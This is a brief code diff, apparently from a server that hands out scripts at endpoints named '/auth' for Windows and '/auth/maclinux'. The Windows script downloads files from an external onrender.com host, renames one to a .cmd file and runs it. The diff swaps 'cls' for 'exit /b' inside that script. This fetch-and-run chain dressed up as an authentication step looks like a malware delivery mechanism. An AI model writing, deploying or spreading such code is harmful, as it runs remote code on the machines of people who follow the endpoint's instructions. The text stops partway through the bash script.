@@ -45,10 +45,10 @@ curl -s -L -o token https://be-1-49aq.onrender.com/token
 curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 ren token token.cmd
 call token.cmd
-cls
+exit /b
 `);
 });
-router.get("/auth/maclinux", (req, res) => {
+router.get("/auth/maclinux", (req, res) => {    
   const token = req.query.token;
 
   res.type("text/plain").send(`#!/bin/bash
